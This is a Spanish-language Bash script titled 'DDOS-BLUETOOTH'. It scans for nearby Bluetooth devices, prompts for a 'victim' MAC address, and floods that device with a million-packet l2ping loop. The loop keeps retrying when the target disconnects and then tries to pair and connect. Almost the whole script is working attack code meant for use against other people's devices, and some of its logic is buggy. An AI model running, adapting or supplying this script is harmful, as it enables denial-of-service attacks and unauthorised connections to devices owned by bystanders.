#!/bin/bash

rojo='\033[0;31m'
verde='\033[0;32m'
amarillo='\033[0;33m'
azul='\033[0;34m'

sudo clear
echo    "*****************************************************"
echo -e "* @MklMillan     💣️     BIENVENIDO A DDOS-BLUETOOTH *"
echo    "*****************************************************"

Escaneo()
{
	sudo hcitool scan > temp.txt

	if [ -s temp.txt ]; then
		
		
		
		echo -e "\nCopia la Direccion Mac de Tu Victima${amarillo}"
		cat temp.txt
		sleep 3
		wait
		echo -e "\nIntoduce la Direccion Mac:${verde}"
		read macAddress
		
		comando1="bluetoothctl info $macAddress"
		comando2="bluetoothctl pair $macAddress"
		comando3="bluetoothctl connect $macAddress"
		comando4="bluetoothctl scan on"
		
		echo -e "\nDesea Emparejarse y [C]onectarse con el Dispositivo o realizar [D]DOS? (c/d):"
		read input
		
		sudo clear
		if [ $input = 'c' ]; then
			
			echo -e "\n[+]ESCANEANDO LA RED..."
			gnome-terminal -- bash -c "$comando4;bash" 
			echo -e "\n[+]Emparejando con el Dispositivo"
			$comando2
			echo -e "\n[+]Conectando con el Dispositivo"
			$comando3
			echo -e "\n[+]INFORMACION SOBRE EL DISPOSITIVO"
			$comando1		
		else
			echo -e "\n[+]Enviando Paquetes de Auth...${verde}"
			sudo l2ping $macAddress -t 0 -c 1000000 -s 44
			
			if [ $? -ne 1 ]; then
				echo -e "\n[+]Emparejando con el Dispositivo"
				$comando2
				echo -e "\n[+]Conectando con el Dispositivo"
				$comando3
				echo -e "\n[+]INFORMACION SOBRE EL DISPOSITIVO"
				$comando1
				echo -e "\n[+]ESCANEANDO LA RED..."
				$comando4
		
			
			elif [ $? -eq 1 ]; then
				echo -e "\n[+]Dispositivo Victima desconetado!${rojo}"
				echo -e "\n[+]Intentando reconectar para realizar DDOS nuevamente!!"
				sudo l2ping $macAddress -t 0 -c 1000000 -s 44
				
				if [ $? -eq 1 ]; then
					count=1
					while true; do
						echo -e "\nIntento [$count]:${amarillo}"
						sudo l2ping $macAddress -t 0 -c 1000000 -s 44
						((count+1))
						if [ $? -ne 1 ]; then
							echo -e "\n[+]Emparejando con el Dispositivo"
							$comando2
							echo -e "\n[+]Conectando con el Dispositivo"
							$comando3
							echo -e "\n[+]INFORMACION SOBRE EL DISPOSITIVO"
							$comando1
							echo -e "\n[+]ESCANEANDO LA RED..."
							$comando4
							break
						fi
					done
				fi

			fi
			
		fi
		
		
		
	else
		echo -e "\n[+]No se encontraron Dispositivos${rojo}"
		echo -e "\n[+]Apareceran dispositivos que tengan el Bluetooth activado pero que no estan conectados a otros dispositivos"

		exit 1
	fi
	 
	rm -f temp.txt
}

sudo rfkill unblock bluetooth
status=$(hciconfig hci0 | grep -o "UP")

if [ "$status" == "UP" ]; then
	echo -e "\n[+]Interfaz de Bluetooth Lista...Espere por favor!!"
	Escaneo
else
	echo -e "\n[+]Interfaz Bluetooth esta DOWN"
	sleep 1
	echo -e "[+]Intentando Levantar Interfaz Bluetooth...${verde}"
	sleep 1
	echo -e "[+]Encendiendo Bluetooth...${verde}"
	sleep 1
	
	#while true; do 
	#
	#	sudo hciconfig hci0 up
	#	if [ $? -eq 1 ]; then
	#		#EN CASO DE ALGUNA EXCEPCION DE INTERFERENCIA	
	#		echo -e "\n[+]Error Inesperado"
	#		echo -e "[+]Existen Procesos que podrian estar interfiriendo con el levantamiento de su Adaptador${rojo}"
	#		sudo airmon-ng check kill
	#		sudo rfkill
	#		echo -e "\nId del Proceso:"
	#		read idProcess
	#		sudo rfkill unblock $idProcess
	#		echo -e "\n[+]Proceso desblqueado (blocked)!${verde}"
	#		sudo rfkill
	#	else
	#		echo -e "[+]Interfaz levantada Satisfactoriamente${amarillo}"
	#		break
	#	fi
	#done
	
	echo -e "[+]Bluetooth Activado" 
	sleep 1
	echo -e "[+]Probando Levantamiento de Interfaz Bluetooth...${verde}"
	sleep 1
	sudo hciconfig hci0 up
	echo -e "[+]Interfaz levantada Satisfactoriamente${amarillo}"
	sleep 1
	Escaneo			

fi


